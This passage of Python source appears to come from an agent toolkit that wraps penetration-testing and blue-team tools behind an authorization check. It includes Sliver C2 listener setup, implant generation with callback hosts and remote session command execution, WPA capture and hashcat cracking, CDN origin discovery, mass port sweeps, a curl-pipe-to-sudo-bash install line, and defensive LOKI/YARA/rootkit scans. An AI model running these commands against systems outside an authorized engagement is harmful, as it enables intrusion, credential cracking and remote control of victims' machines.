        "nohup zaproxy -daemon -host 127.0.0.1 -port $PORT -config api.key=$KEY "
        "-config api.disablekey=false -newsession $SESS >/tmp/zap_$$.log 2>&1 & ZPID=$!; "
        "up=0; for i in $(seq 1 90); do "
        "curl -s \"http://127.0.0.1:$PORT/JSON/core/view/version/?apikey=$KEY\" 2>/dev/null | grep -q version && { up=1; break; }; "
        "sleep 2; done; "
        "if [ \"$up\" != 1 ]; then echo 'DAST_ERROR: ZAP daemon did not come up'; tail -20 /tmp/zap_$$.log 2>/dev/null; kill $ZPID 2>/dev/null; exit 6; fi; "
        "python3 - $PORT $KEY " + shlex.quote(target) + " " + shlex.quote(mode) + " <<'ZAPPY'\n"
        + driver +
        "ZAPPY\n"
        "RC=$?; curl -s \"http://127.0.0.1:$PORT/JSON/core/action/shutdown/?apikey=$KEY\" >/dev/null 2>&1; "
        "kill $ZPID 2>/dev/null; rm -rf $SESS* /tmp/zap_$$.log 2>/dev/null; exit $RC"
    )
    out, rc, where = _off_run(cmd, tmo, need=("zaproxy", "curl", "python3"))
    return _off_report("dast(" + mode + ")", args.get("authorization", ""), "zap " + mode + " " + target, out, rc, where)


# 8d. detect — DEFENSIVE compromise assessment (blue team), the mirror of the
#     offensive suite. Structure/concept modelled on Nextron THOR/THOR Lite: a
#     multi-module local scan (filesystem YARA+IOC, web-shell, rootkit, malware,
#     Sigma logs). Engine is LOKI (Neo23x0, the free open-source THOR-Lite sibling
#     by the same author) + YARA-Forge rules + chainsaw. Runs in the purple
#     container if present, else the offensive toolbox, else the host. Read-only
#     analysis of LOCAL paths/logs — no target/authorization needed.
def _def_container() -> str:
    """Resolve the container for defensive tools: the purple container if it is
    running (start it if it merely exists), else the offensive toolbox, else ''."""
    pc = os.environ.get("SYGNIF_PY_PURPLE_CONTAINER", "sygnif-purple")
    if not _IS_WINDOWS and _run_host("command -v docker", 10)[1] == 0:
        st, _ = _run_host("docker inspect -f '{{.State.Status}}' " + shlex.quote(pc) + " 2>/dev/null", 10)
        st = st.strip()
        if st == "running":
            return pc
        if st:  # exists but stopped
            _run_host("docker start " + shlex.quote(pc), 60)
            st2, _ = _run_host("docker inspect -f '{{.State.Status}}' " + shlex.quote(pc) + " 2>/dev/null", 10)
            if st2.strip() == "running":
                return pc
    return _toolbox_name(auto_create=False)  # offensive toolbox, or '' for host


def _def_run(command: str, timeout: int | None = None, need=None) -> tuple[str, int, str]:
    """Run a defensive command in the resolved container (purple > toolbox > host).
    need= preflights binaries with a clear 'missing' message (see _off_run)."""
    timeout = timeout or OFFENSIVE_TIMEOUT
    box = _def_container()

    def _x(cmd, t):
        if box:
            return _run_host("docker exec " + shlex.quote(box) + " bash -lc " + shlex.quote(cmd), t)
        return _run_host(cmd, t)

    if need:
        names = [b for b in (need if isinstance(need, (list, tuple)) else [need]) if b]
        if names:
            checks = "; ".join("command -v " + shlex.quote(b) + " >/dev/null 2>&1 || echo MISSING:" + b
                               for b in names)
            o, _rc = _x(checks, 30)
            miss = sorted({ln.split("MISSING:", 1)[1].strip() for ln in o.splitlines()
                           if ln.startswith("MISSING:")})
            if miss:
                loc = "the container (" + box + ")" if box else "this host"
                return ("MISSING TOOL(S): " + ", ".join(miss) + " — not in " + loc
                        + ". Run `sygnif kali-setup` (it installs the defence tools), or install them.",
                        127, "preflight")
    out, rc = _x(command, timeout)
    return out, rc, ("docker:" + box if box else "host")


def _def_report(title: str, cmd: str, out: str, rc: int, where: str) -> str:
    return _truncate("[" + title + " | via " + where + "]\n$ " + cmd + "\n\n"
                     + (out or "(no output)") + "\nexit=" + str(rc))


def tool_detect(args: dict) -> str:
    mode = str(args.get("mode", "ioc")).strip().lower()
    path = str(args.get("path", "") or args.get("target", "")).strip()

    if mode in ("ioc", "scan", "webshell"):
        if not path:
            return ("detect " + mode + ": give a 'path' (directory or file). ioc=full local "
                    "compromise scan; webshell=file-only scan of a web root.")
        p = shlex.quote(path)
        extra = "--noprocscan" if mode == "webshell" else ""
        cmd = ("L=$(find /opt/loki -name loki.py 2>/dev/null | head -1); "
               "if [ -z \"$L\" ]; then echo LOKI_MISSING; exit 127; fi; "
               "python3 \"$L\" -p " + p + " --dontwait --noindicator " + extra
               + " 2>&1 | grep -iE 'ALERT|WARNING|NOTICE|Results:|MATCHES|FINISHED' | tail -140")
        out, rc, where = _def_run(cmd, 1500)
        if "LOKI_MISSING" in out:
            return ("detect: LOKI not installed — run `sygnif kali-setup` (installs LOKI + "
                    "signature-base + the defence tools).")
        return _def_report("detect(" + mode + ")", "loki -p " + path, out or "(no alerts)", rc, where)

    if mode == "yara":
        if not path:
            return "detect yara: give a 'path' to scan."
        rules = str(args.get("rules", "")).strip()
        rsel = shlex.quote(rules) if rules else "$(ls /opt/yara-forge/packages/*/*.yar 2>/dev/null | head -1)"
        cmd = ("R=" + rsel + "; if [ -z \"$R\" ] || [ ! -s \"$R\" ]; then echo YARA_RULES_MISSING; exit 127; fi; "
               "yara -r -w -f \"$R\" " + shlex.quote(path) + " 2>&1 | head -160")
        out, rc, where = _def_run(cmd, 900, need=("yara",))
        if "YARA_RULES_MISSING" in out:
            return ("detect yara: no rules — pass 'rules':<path>, or run `sygnif kali-setup` to fetch "
                    "the YARA-Forge ruleset.")
        return _def_report("detect(yara)", "yara -r " + path, out or "(no matches)", rc, where)

    if mode == "rootkit":
        cmd = ("echo '== rkhunter =='; rkhunter --check --sk --nocolors --rwo 2>&1 | tail -60; "
               "echo '== chkrootkit =='; command -v chkrootkit >/dev/null 2>&1 && "
               "(chkrootkit 2>/dev/null | grep -ivE 'not infected|not found|nothing found|not tested' | head -40 "
               "|| echo '(clean)') || echo '(chkrootkit not installed)'")
        out, rc, where = _def_run(cmd, 900, need=("rkhunter",))
        return _def_report("detect(rootkit)", "rkhunter + chkrootkit", out, rc, where)

    if mode == "malware":
        if not path:
            return "detect malware: give a 'path' (file or dir) to scan (clamav; capa for a single binary)."
        p = shlex.quote(path)
        cmd = ("echo '== clamav =='; command -v clamscan >/dev/null 2>&1 && "
               "clamscan -r --infected --no-summary " + p + " 2>&1 | head -80 || echo '(clamscan not installed)'; "
               "echo '== capa (if a single binary) =='; "
               "if command -v capa >/dev/null 2>&1 && [ -f " + p + " ]; then capa " + p
               + " 2>/dev/null | grep -iE 'CAPABILITY|ATT&CK|MBC|namespace' | head -40; "
               "else echo '(capa skipped: not a single file or capa absent)'; fi")
        out, rc, where = _def_run(cmd, 900)
        return _def_report("detect(malware)", "clamscan + capa " + path, out, rc, where)

    if mode == "sigma":
        if not path:
            return ("detect sigma: give a 'path' to a Windows .evtx file/dir. Uses chainsaw + Sigma. "
                    "For Linux auditd/JSON logs use zircolite via the purple tool.")
        p = shlex.quote(path)
        cmd = ("S=$(ls -d /opt/chainsaw*/sigma /opt/chainsaw/sigma 2>/dev/null | head -1); "
               "M=$(ls /opt/chainsaw*/mappings/sigma-event-logs-all.yml /opt/chainsaw/mappings/*.yml 2>/dev/null | head -1); "
               "if ! command -v chainsaw >/dev/null 2>&1; then echo CHAINSAW_MISSING; exit 127; fi; "
               "if [ -n \"$S\" ] && [ -n \"$M\" ]; then chainsaw hunt " + p + " -s \"$S\" --mapping \"$M\" 2>&1 | tail -120; "
               "else chainsaw hunt " + p + " 2>&1 | tail -120; fi")
        out, rc, where = _def_run(cmd, 900)
        if "CHAINSAW_MISSING" in out:
            return "detect sigma: chainsaw not installed — run `sygnif kali-setup`."
        return _def_report("detect(sigma)", "chainsaw hunt " + path, out, rc, where)

    return ("detect: mode = ioc | webshell | yara | rootkit | malware | sigma.  "
            "ioc=LOKI full local compromise scan of a 'path'; webshell=LOKI file scan of a web root; "
            "yara=YARA-Forge (or custom 'rules') over a 'path'; rootkit=rkhunter+chkrootkit; "
            "malware=clamav(+capa) on a 'path'; sigma=chainsaw over Windows .evtx. "
            "Defensive, read-only, local paths — no authorization needed.")


# 9. wifi_capture — WPA handshake / PMKID capture on an authorized network.
#    Requires a monitor-mode interface and an explicit BSSID/SSID authorization.
def tool_wifi_capture(args: dict) -> str:
    iface = str(args.get("interface", "") or args.get("iface", "")).strip()
    bssid = str(args.get("bssid", "") or args.get("ssid", "")).strip()
    target = bssid or iface
    g = _authz(args, target)
    if g:
        return g
    if not iface:
        return ("wifi_capture: give the PHYSICAL 'interface' (e.g. wlan0) and the 'bssid' of the "
                "network YOU are authorized to test. hcxdumptool (>=7.x) sets monitor mode itself — "
                "pass the real interface, NOT a wlanXmon virtual one, and do not run airmon-ng first.")
    out_file = str(args.get("out", "/tmp/capture.pcapng")).strip()
    secs = int(args.get("seconds", 60))
    channel = str(args.get("channel", "")).strip()
    extra = str(args.get("extra", "")).strip()
    # hcxdumptool 6.3/7.x: target one AP by compiling a BPF on its BSSID (addr3),
    # not the removed --filterlist_ap. Frequencies: -c <chan+band e.g. 11a> or -F (all).
    pre, bpf = "", ""
    if bssid:
        mac = re.sub(r"[^0-9a-fA-F]", "", bssid)
        if len(mac) == 12:
            pre = f"hcxdumptool --bpfc={shlex.quote('wlan addr3 ' + mac)} > /tmp/_wifi.bpf 2>/dev/null; "
            bpf = "--bpf=/tmp/_wifi.bpf "
    freq = f"-c {shlex.quote(channel)} " if channel else "-F "
    cmd = (f"{pre}timeout {secs} hcxdumptool -i {shlex.quote(iface)} -w {shlex.quote(out_file)} "
           f"{freq}{bpf}{extra}").strip()
    out, rc, where = _off_run(cmd, secs + 30)
    if rc != 0 and not _have("hcxdumptool"):
        return ("hcxdumptool not installed (`apt install hcxdumptool`), or the adapter lacks "
                "monitor-mode + frame-injection. Alternative via the shell tool: airmon-ng start "
                f"{iface}; airodump-ng -c <ch> --bssid {bssid or '<BSSID>'} -w cap {iface}mon.")
    tail = ("\n[next: hcxpcapngtool -o hash.22000 " + out_file
            + "  then the 'crack' tool {hashfile:hash.22000, mode:22000, wordlist:...}. "
            "hcxdumptool + hcxpcapngtool versions must match. WPA3-SAE is not affected.]")
    return _off_report("wifi_capture", args.get("authorization", ""), cmd, out + tail, rc, where)


# 10. wifi_crack — turn a capture into a hash and crack it (offline).
def tool_wifi_crack(args: dict) -> str:
    cap = str(args.get("capture", "") or args.get("pcapng", "")).strip()
    target = str(args.get("target", "") or cap or "wifi-capture").strip()
    g = _authz(args, target)
    if g:
        return g
    if not cap:
        return "wifi_crack: give the 'capture' file (.pcapng/.cap) and a 'wordlist'."
    wl = str(args.get("wordlist", "/usr/share/wordlists/rockyou.txt")).strip()
    hashf = "/tmp/_wifi.22000"
    conv = (f"hcxpcapngtool -o {hashf} {shlex.quote(cap)} 2>/dev/null || "
            f"(aircrack-ng {shlex.quote(cap)} -w {shlex.quote(wl)})")
    cmd = f"{conv}; [ -s {hashf} ] && hashcat -m 22000 {hashf} {shlex.quote(wl)} --quiet"
    out, rc, where = _off_run(cmd)
    return _off_report("wifi_crack", args.get("authorization", ""), cmd, out, rc, where)



# --- C2 orchestration (AUTHORIZED ADVERSARY EMULATION ONLY) -----------------
# A thin manager around a standard open-source C2 framework — Sliver
# (BishopFox/sliver, MIT) by default — for authorized red-team / adversary-
# emulation engagements: stand up a listener, generate a beacon/implant for the
# authorized scope, list sessions/beacons, run a command in a session. Same hard
# gate as the other offensive tools: a 'target' (the engagement/scope) plus an
# 'authorization' attestation, SCOPE.md-confined when present.
# It ORCHESTRATES a known framework; it does not build custom implants, AV/EDR
# evasion, or anything for mass/unauthorized deployment. Live interactive shells
# belong in a real sliver-client — this drives the scriptable operations.
SLIVER_BIN = os.environ.get("SYGNIF_PY_SLIVER_BIN", "sliver-server")


def _sliver(console_script: str, timeout: int | None = None) -> tuple[str, int, str]:
    """Pipe newline-separated console commands to sliver-server (best-effort;
    Sliver has no one-shot flag, so we feed the console over stdin)."""
    cmd = "printf '%s\\n' " + shlex.quote(console_script) + " | " + SLIVER_BIN
    return _off_run(cmd, timeout or OFFENSIVE_TIMEOUT)


def tool_c2(args: dict) -> str:
    """Manage a Sliver C2 for an authorized engagement (listener/generate/sessions/exec)."""
    op = str(args.get("op", "") or args.get("action", "status")).strip().lower()

    # status/help never touch a target — pure local capability check.
    if op in ("status", "check", ""):
        o, rc, where = _off_run(
            "command -v " + shlex.quote(SLIVER_BIN) + " && " + shlex.quote(SLIVER_BIN)
            + " version 2>/dev/null | head -5", 30)
        if rc != 0 or not o.strip():
            return ("c2: Sliver not installed. It's the standard open-source C2 for authorized "
                    "red-team work (BishopFox/sliver, MIT). Install: "
                    "`curl https://sliver.sh/install | sudo bash`, or `apt install sliver` on Kali. "
                    "Set SYGNIF_PY_SLIVER_BIN if the binary name differs (default " + SLIVER_BIN + ").")
        return _off_report("c2 status", "n/a", SLIVER_BIN + " version", o, rc, where)
    if op == "help":
        return ("c2 ops: status | listener | generate | sessions | beacons | exec. "
                "All except status need target + authorization. "
                "listener {op:listener, proto:https|http|mtls, lport, lhost}. "
                "generate {op:generate, os:windows|linux|darwin, arch:amd64, format:exe|shellcode|shared, "
                "proto:https, lhost, lport, beacon:true, save:/path}. "
                "exec {op:exec, session:<id>, command:'whoami'}.")

    target = str(args.get("target", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    auth = args.get("authorization", "")

    if op == "listener":
        proto = str(args.get("proto", "https")).lower()
        lport = str(args.get("lport", "443" if proto == "https" else "80")).strip()
        lhost = str(args.get("lhost", "")).strip()
        line = {"https": "https --lport " + lport, "http": "http --lport " + lport,
                "mtls": "mtls --lport " + lport}.get(proto, "https --lport " + lport)
        if lhost:
            line += " --lhost " + lhost
        o, rc, where = _sliver(line + "\njobs\nexit", 120)
        return _off_report("c2 listener", auth, line, o, rc, where)

    if op == "generate":
        os_ = str(args.get("os", "windows")).lower()
        arch = str(args.get("arch", "amd64")).lower()
        fmt = str(args.get("format", "exe")).lower()
        proto = str(args.get("proto", "https")).lower()
        lhost = str(args.get("lhost", "")).strip()
        lport = str(args.get("lport", "443")).strip()
        save = str(args.get("save", "/tmp/implant")).strip()
        beacon = "beacon " if str(args.get("beacon", "")).lower() in ("1", "true", "yes") else ""
        if not lhost:
            return "c2 generate: give 'lhost' (the C2 callback host for this authorized engagement)."
        gen = ("generate " + beacon + "--os " + os_ + " --arch " + arch + " --format " + fmt
               + " --" + proto + " " + lhost + ":" + lport + " --save " + save)
        o, rc, where = _sliver(gen + "\nexit", 600)
        return _off_report("c2 generate", auth, gen, o, rc, where)

    if op in ("sessions", "beacons"):
        o, rc, where = _sliver(op + "\nexit", 60)
        return _off_report("c2 " + op, auth, op, o, rc, where)

    if op == "exec":
        sid = str(args.get("session", "") or args.get("id", "")).strip()
        command = str(args.get("command", "") or args.get("cmd", "")).strip()
        if not sid or not command:
            return "c2 exec: give 'session' (id) and 'command'. For live interactive control use sliver-client."
        script = "sessions -i " + sid + "\nexecute -o -- " + command + "\nbackground\nexit"
        o, rc, where = _sliver(script, 120)
        return _off_report("c2 exec", auth, "session " + sid + ": " + command, o, rc, where)

    return ("c2: unknown op '" + op + "'. Use status | listener | generate | sessions | beacons | "
            "exec (see op=help).")


# --- Gap-fill tools: code security, TLS/headers, takeover, OSINT, network,
#     password strength, cellular (defensive) ----------------------------------
# Local-file tools (secrets_scan, sast) run on the HOST where the seat runs, so
# they see your own code; network tools run in the kali container if present.
# Cellular here is DEFENSIVE ONLY: your own modem's serving cell + tower lookup +
# IMSI-catcher detection. No transmitting, no interception — that is illegal.
import hashlib
import math

HIBP_RANGE = "https://api.pwnedpasswords.com/range/"
OPENCELLID = "https://opencellid.org/cell/get"
OPENCELLID_KEY = os.environ.get("OPENCELLID_API_KEY", "").strip()


def _resp_headers(url: str) -> tuple[dict, int, str]:
    """GET a URL and return (headers_dict_lowercased, status, error)."""
    req = urllib.request.Request(
        url, headers={"User-Agent": _BROWSER_UA, "Accept": "*/*"}, method="GET")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            h = {k.lower(): v for k, v in r.headers.items()}
            return h, getattr(r, "status", 200), ""
    except urllib.error.HTTPError as e:
        h = {k.lower(): v for k, v in (e.headers or {}).items()}
        return h, e.code, f"HTTP {e.code}"
    except Exception as e:  # noqa: BLE001
        return {}, 0, f"{type(e).__name__}: {e}"


# 1. secrets_scan — trufflehog + gitleaks over a repo/dir you own (runs on host)
def _local_or_toolbox(path: str, cmd_tmpl: str, need_bin: str, timeout: int = 900):
    """Run a file-scanning command where the files live. Host binary first; else
    copy the path into sygnif-py's Docker toolbox (if it has the binary) and run
    there — so these work with zero host installs when Docker is present."""
    ap = os.path.abspath(os.path.expanduser(path))
    if _run_host("command -v " + shlex.quote(need_bin), 10)[1] == 0:
        out, rc = _run_host(cmd_tmpl.format(p=shlex.quote(ap)), timeout)
        return out, rc, "host"
    box = _toolbox_name(auto_create=True)
    if box and _run_host("docker exec " + box + " command -v " + shlex.quote(need_bin), 15)[1] == 0:
        dst = "/tmp/scan_" + str(abs(hash(ap)) % 100000)
        _run_host(f"docker cp {shlex.quote(ap)} {box}:{dst}", 300)
        out, rc = _run_host("docker exec " + box + " bash -lc " + shlex.quote(cmd_tmpl.format(p=dst)), timeout)
        _run_host(f"docker exec {box} rm -rf {shlex.quote(dst)}", 30)
        return out, rc, f"docker:{box}"
    return "", 127, "missing:" + need_bin


def tool_secrets_scan(args: dict) -> str:
    path = os.path.expanduser(str(args.get("path") or args.get("repo") or "."))
    if not os.path.exists(path):
        return f"secrets_scan: path not found: {path}"
    tmpl = ("echo '== trufflehog =='; trufflehog filesystem {p} --no-update 2>/dev/null | head -200; "
            "echo '== gitleaks =='; gitleaks detect --source {p} --no-banner -v 2>/dev/null | head -200")
    out, rc, where = _local_or_toolbox(path, tmpl, "trufflehog", 600)
    if where.startswith("missing"):
        return ("secrets_scan needs trufflehog/gitleaks. Either install them on this host, or "
                "provision the toolbox with `sygnif kali-setup` (Docker) and they'll run there.")
    return _off_report("secrets_scan", "own code", f"scan {path}", out, rc, where)


# 1b. trufflehog — deep secret hunting across filesystem/git/github/gitlab, with live verification
def tool_trufflehog(args: dict) -> str:
    """Hunt secrets with trufflehog across a filesystem, git repo, GitHub org/repo, or GitLab
    instance, verifying hits against the live provider. Complements secrets_scan (which only
    runs trufflehog+gitleaks over a local path) by reaching REMOTE sources and validating."""
    q = shlex.quote
    source = str(args.get("source", "filesystem")).strip().lower()
    target = str(args.get("target", "") or args.get("path", "") or args.get("repo", "")).strip()
    results = str(args.get("results", "verified")).strip().lower()  # verified|unknown|unverified|all
    parts = ["trufflehog", source, "--no-update"]
    if results and results != "all":
        parts.append("--results=" + q(results))
    if str(args.get("json", "")).strip().lower() in ("1", "true", "yes"):
        parts.append("--json")
    if source == "filesystem":
        parts.append(q(target or "."))  # path must be inside the container/workspace mount
    elif source == "git":
        if not target:
            return "trufflehog git: needs 'target' (repo URL, or a local repo path in the toolbox/workspace mount)."
        br = str(args.get("branch", "")).strip()
        since = str(args.get("since", "")).strip()
        if br:
            parts += ["--branch", q(br)]
        if since:
            parts += ["--since-commit", q(since)]
        parts.append(q(target))
    elif source == "github":
        org = str(args.get("org", "")).strip()
        if not target and not org:
            return "trufflehog github: needs 'target' (a --repo URL) or 'org' (a --org name)."
        if target:
            parts += ["--repo", q(target)]
        if org:
            parts += ["--org", q(org)]
        tok = str(args.get("token", "")).strip()
        if tok:
            parts += ["--token", q(tok)]
    elif source == "gitlab":
        tok = str(args.get("token", "")).strip()
        if not tok:
            return ("trufflehog gitlab: needs 'token' (a GitLab PAT — it scans every repo that token can see; "
                    "for the lab, source ~/sygnif-pentest/lab-creds.env and pass $GL19_TOKEN).")
        parts += ["--token", q(tok)]
        ep = str(args.get("endpoint", "")).strip()
        if ep:
            parts += ["--endpoint", q(ep)]
        if target:
            parts += ["--repo", q(target)]
    else:
        return "trufflehog: 'source' must be filesystem|git|github|gitlab."
    extra = str(args.get("extra", "")).strip()
    if extra:
        parts.append(extra)
    out, rc, where = _off_run(" ".join(parts), min(OFFENSIVE_TIMEOUT, 1800), need="trufflehog")
    return _off_report("trufflehog", args.get("authorization", "secret-scan (own/authorized sources)"),
                       " ".join(parts), out, rc, where)


# 2. sast — semgrep static analysis of your own source (runs on host)
def tool_sast(args: dict) -> str:
    path = os.path.expanduser(str(args.get("path") or "."))
    cfg = str(args.get("config", "auto")).strip() or "auto"
    tmpl = "semgrep --config " + shlex.quote(cfg) + " {p} --quiet 2>&1 | head -300"
    out, rc, where = _local_or_toolbox(path, tmpl, "semgrep", 900)
    if where.startswith("missing"):
        return ("sast needs semgrep. Install on host (pipx install semgrep), or provision the "
                "toolbox with `sygnif kali-setup` (Docker) and it'll run there.")
    return _off_report("sast (semgrep)", "own code", f"semgrep {cfg} {path}", out, rc, where)


# 3. tls_check — testssl / sslscan on an authorized host
def tool_tls_check(args: dict) -> str:
    target = str(args.get("target", "") or args.get("host", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    host = _bare_host(target)
    if _have("testssl") or _have("testssl.sh"):
        cmd = f"(testssl --quiet --color 0 {shlex.quote(host)} 2>/dev/null || testssl.sh --quiet {shlex.quote(host)}) | head -120"
    else:
        cmd = f"sslscan --no-colour {shlex.quote(host)} 2>/dev/null | head -120"
    out, rc, where = _off_run(cmd, 600)
    return _off_report("tls_check", args.get("authorization", ""), cmd, out, rc, where)


# 4. headers — security header + cookie grade (keyless, one GET, passive)
def tool_headers(args: dict) -> str:
    url = _norm_url(str(args.get("url", "") or args.get("target", "")))
    if not url:
        return "headers: give a 'url' (yours / authorized)."
    h, status, err = _resp_headers(url)
    if not h and err:
        return f"headers: could not fetch {url} ({err})."
    want = {
        "content-security-policy": "CSP — controls script/resource origins (XSS defence)",
        "strict-transport-security": "HSTS — forces HTTPS",
        "x-content-type-options": "nosniff — stops MIME sniffing",
        "x-frame-options": "clickjacking defence (or CSP frame-ancestors)",
        "referrer-policy": "limits referrer leakage",
        "permissions-policy": "restricts browser features",
    }
    lines = [f"Security headers for {url} (HTTP {status}):"]
    missing = []
    for k, why in want.items():
        v = h.get(k)
        if v:
            lines.append(f"  OK  {k}: {v[:80]}")
        else:
            missing.append(k)
            lines.append(f"  --  MISSING {k}  ({why})")
    server = h.get("server")
    if server:
        lines.append(f"  info server: {server} (version disclosure — consider hiding)")
    cookies = h.get("set-cookie", "")
    if cookies:
        flags = [f for f in ("HttpOnly", "Secure", "SameSite") if f.lower() not in cookies.lower()]
        lines.append("  cookie flags missing: " + (", ".join(flags) if flags else "none — good"))
    aco = h.get("access-control-allow-origin")
    if aco == "*":
        lines.append("  ⚠ CORS: Access-Control-Allow-Origin: * (risk if credentials are allowed)")
    lines.insert(1, f"  score: {len(want)-len(missing)}/{len(want)} present"
                    + (f" — add: {', '.join(missing)}" if missing else " — all present"))
    return _truncate("\n".join(lines))


# 5. takeover — subdomain takeover check (subfinder -> subjack / nuclei)
def tool_akamai(args: dict) -> str:
    """Akamai-aware recon for an authorized target behind Akamai's CDN/WAF. modes:
    detect (is it Akamai + which product) | debug (send Akamai Pragma debug directives and
    read the akamai-x-* edge headers: cache key, request id, edge server) | origin (find the
    real backend to test directly: DNS/A records, subdomains that skip the CDN, cert SANs).
    Requires 'target'+'authorization'; SCOPE.md-confined. Read-only recon — it does NOT forge
    Bot Manager sensor data / _abck cookies (anti-bot bypass is out of scope)."""
    url = _norm_url(str(args.get("target", "") or args.get("url", "")).strip())
    g = _authz(args, url)
    if g:
        return g
    q = shlex.quote
    host = urllib.parse.urlparse(url).hostname or url
    mode = str(args.get("mode", "detect")).strip().lower()
    if mode == "detect":
        cmd = (
            "echo '== wafw00f =='; wafw00f " + q(url) + " 2>/dev/null | grep -iE 'is behind|akamai|detected|no WAF' | head; "
            "echo '== edge signature headers =='; curl -sI -m 12 -A " + q(_BROWSER_UA) + " " + q(url) +
            " 2>/dev/null | grep -iE 'server|akamaighost|x-akamai|x-cache|x-check-cacheable|x-true-cache-key|^via|x-served-by'"
        )
        need = None
    elif mode == "debug":
        # Akamai's documented Pragma debug directives — the edge echoes akamai-x-* headers back.
        pragma = ("akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, "
                  "akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-request-id, "
                  "akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-nonces, "
                  "akamai-x-feo-trace")
        cmd = ("curl -sI -m 12 -A " + q(_BROWSER_UA) + " -H " + q("Pragma: " + pragma) + " " + q(url) +
               " 2>/dev/null | grep -iE 'x-akamai|x-cache|x-check-cacheable|x-true-cache-key|x-serial|x-request-id|akamai' || "
               "echo '(no akamai-x-* headers returned — not Akamai, or debug directives stripped)'")
        need = None
    elif mode == "origin":
        cmd = (
            "echo '== A/AAAA + CNAME (dnsx) =='; echo " + q(host) + " | dnsx -a -aaaa -cname -resp -silent 2>/dev/null; "
            "echo '== subdomains that may skip the CDN (subfinder -> httpx, non-Akamai IPs are candidates) =='; "
            "subfinder -d " + q(host) + " -silent 2>/dev/null | httpx -silent -ip -title -status-code -cdn 2>/dev/null | head -40; "
            "echo '== cert SANs (origin hostnames sometimes leak here) =='; "
            "echo | openssl s_client -connect " + q(host) + ":443 -servername " + q(host) +
            " 2>/dev/null | openssl x509 -noout -ext subjectAltName 2>/dev/null | tail -1; "
            "echo '== pivot: favicon/cert hash in shodan/censys via the shodan tool to find the origin IP =='"
        )
        need = ("subfinder", "httpx", "dnsx")
    else:
        return "akamai: 'mode' must be detect | debug | origin."
    extra = str(args.get("extra", "")).strip()
    if extra:
        cmd += " " + extra
    out, rc, where = _off_run(cmd, min(OFFENSIVE_TIMEOUT, 900), need=need)
    return _off_report("akamai(" + mode + ")", args.get("authorization", ""), cmd, out, rc, where, target=host)


def tool_takeover(args: dict) -> str:
    domain = str(args.get("domain", "") or args.get("target", "")).strip()
    g = _authz(args, domain)
    if g:
        return g
    d = _bare_host(domain)
    q = shlex.quote(d)
    cmd = (f"echo '== subfinder =='; command -v subfinder >/dev/null 2>&1 && (subfinder -silent -d {q} 2>/dev/null | tee /tmp/_subs.txt | wc -l | xargs echo 'subdomains:') || echo '(subfinder not installed)'; "
           f"echo '== subjack =='; command -v subjack >/dev/null 2>&1 && (subjack -w /tmp/_subs.txt -ssl -t 50 -timeout 15 2>/dev/null | grep -iv 'Not Vulnerable' | head -40 || echo '(no takeover candidates)') || echo '(subjack not installed)'; "
           f"echo '== nuclei takeover =='; command -v nuclei >/dev/null 2>&1 && (nuclei -silent -l /tmp/_subs.txt -tags takeover 2>/dev/null | head -40) || echo '(nuclei not installed)'")
    out, rc, where = _off_run(cmd, 900)
    return _off_report("takeover", args.get("authorization", ""), "takeover " + d, out, rc, where)


# 6. osint — passive intelligence on an authorized domain
def tool_osint(args: dict) -> str:
    domain = str(args.get("domain", "") or args.get("target", "")).strip()
    g = _authz(args, domain)
    if g:
        return g
    uname = str(args.get("username", "")).strip()
    if uname:
        cmd = "sherlock " + shlex.quote(uname) + " --timeout 15 --print-found 2>/dev/null | head -60"
        out, rc, where = _off_run(cmd, 300, need=("sherlock",))
        return _off_report("osint(username)", args.get("authorization", ""), "sherlock " + uname, out, rc, where)
    d = shlex.quote(_bare_host(domain))
    cmd = (f"echo '== theHarvester =='; theHarvester -d {d} -b duckduckgo,crtsh,bing -l 200 2>/dev/null | grep -iE '@|host|ip' | head -60; "
           f"echo '== dns =='; dnsx -silent -a -resp -d {d} 2>/dev/null | head -20; "
           f"echo '== SPF/DMARC =='; dig +short TXT {d}; dig +short TXT _dmarc.{d}")
    out, rc, where = _off_run(cmd, 600)
    return _off_report("osint", args.get("authorization", ""), "osint " + _bare_host(domain), out, rc, where)


# 7. portscan — structured nmap on an authorized target
def tool_portscan(args: dict) -> str:
    target = str(args.get("target", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    ports = str(args.get("ports", "")).strip()
    extra = str(args.get("extra", "")).strip()
    pflag = f"-p {shlex.quote(ports)}" if ports else "--top-ports 1000"
    cmd = f"nmap -sV -sC {pflag} -Pn {shlex.quote(target)} {extra} 2>&1 | head -150"
    out, rc, where = _off_run(cmd, 900)
    return _off_report("portscan", args.get("authorization", ""), cmd, out, rc, where)


# 7b. cidr_scan — sweep a whole CIDR range for live hosts + open ports
def tool_cidr_scan(args: dict) -> str:
    """Sweep an authorized CIDR range. modes: discover (nmap ping-sweep → live hosts) |
    ports (naabu connect-scan across the range, or masscan for speed) | full (host+port
    sweep, then nmap -sV on what's found). Requires 'target' (the CIDR) + 'authorization';
    SCOPE.md-confined when present. A CIDR is loud and wide — scope it tightly."""
    target = str(args.get("target", "") or args.get("cidr", "")).strip()
    g = _authz(args, target)
    if g:
        return g
    q = shlex.quote
    mode = str(args.get("mode", "discover")).strip().lower()
    ports = str(args.get("ports", "")).strip()
    rate = str(args.get("rate", "1000")).strip()
    engine = str(args.get("engine", "")).strip().lower()  # ports mode: naabu (default) | masscan
    extra = str(args.get("extra", "")).strip()
    if mode == "discover":
        cmd = "nmap -sn -n " + q(target) + " -oG - 2>/dev/null | awk '/Up/{print $2}'"
        need = "nmap"
        timeout = 600
    elif mode == "ports":
        p = ports or "1-1000"
        if engine == "masscan":
            cmd = "masscan " + q(target) + " -p" + q(p) + " --rate " + q(rate) + " 2>/dev/null"
            need = "masscan"
        else:  # naabu connect scan — reliable, needs no raw socket
            cmd = "naabu -host " + q(target) + " -p " + q(p) + " -s c -silent 2>/dev/null"
            need = "naabu"
        timeout = min(OFFENSIVE_TIMEOUT, 1800)
    elif mode == "full":
        p = ports or "1-1000"
        # 1) naabu finds live host:port pairs across the CIDR; 2) nmap -sV fingerprints exactly those
        cmd = (
            "TMP=$(mktemp); echo '== host:port sweep (naabu) =='; "
            "naabu -host " + q(target) + " -p " + q(p) + " -s c -silent 2>/dev/null | tee \"$TMP\"; "
            "echo; echo '== service/version on discovered host:ports (nmap -sV) =='; "
